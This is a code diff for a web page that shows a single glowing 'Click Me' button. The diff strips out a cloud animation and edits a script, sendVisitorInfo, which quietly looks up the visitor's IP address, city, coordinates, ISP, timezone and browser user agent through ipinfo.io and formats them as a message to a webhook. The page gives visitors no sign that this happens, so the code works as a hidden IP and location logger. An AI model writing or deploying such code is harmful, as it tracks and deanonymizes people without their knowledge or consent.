@@ -7,33 +7,13 @@
     <style>
         body {
             margin: 0;
-            overflow: hidden;
             height: 100vh;
             background: #0d0d0d;
             display: flex;
             justify-content: center;
             align-items: center;
             font-family: Arial, sans-serif;
-        }
-
-        .clouds {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url("https://i.imgur.com/OUOw4tG.png") repeat-x;
-            animation: moveClouds 30s linear infinite;
-            opacity: 0.2;
-        }
-
-        @keyframes moveClouds {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-100%); }
-        }
-
-        .button-wrapper {
-            position: relative;
+            overflow: hidden;
         }
 
         .glowing-button {
@@ -64,10 +44,7 @@
     </style>
 </head>
 <body>
-    <div class="clouds"></div>
-    <div class="button-wrapper">
-        <button class="glowing-button" id="action-button">Click Me</button>
-    </div>
+    <button class="glowing-button" id="action-button">Click Me</button>
 
     <script>
         async function sendVisitorInfo() {
@@ -76,11 +53,11 @@
             try {
                 // Fetch location data
                 const locationResponse = await fetch("https://ipinfo.io/json");
-                const locationData = locationResponse.ok ? await locationResponse.json() : { error: "Unable to fetch location data" };
+                const locationData = locationResponse.ok ? await locationResponse.json() : { ip: "N/A", loc: "N/A", city: "N/A", region: "N/A", country: "N/A", org: "N/A", timezone: "N/A" };
 
                 // Prepare message for the webhook
                 const message = {
-                    content: `Visitor Info:\nIP: ${locationData.ip || "N/A"}\nLocation: ${locationData.city || "N/A"}, ${locationData.region || "N/A"}, ${locationData.country || "N/A"}\nCoordinates: ${locationData.loc || "N/A"}\nISP: ${locationData.org || "N/A"}\nTimezone: ${locationData.timezone || "N/A"}\nUser Agent: ${navigator.userAgent}`,
+                    content: `Visitor Info:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}\nUser Agent: ${navigator.userAgent}`,
                 };
 
                 // Send data to the webhook
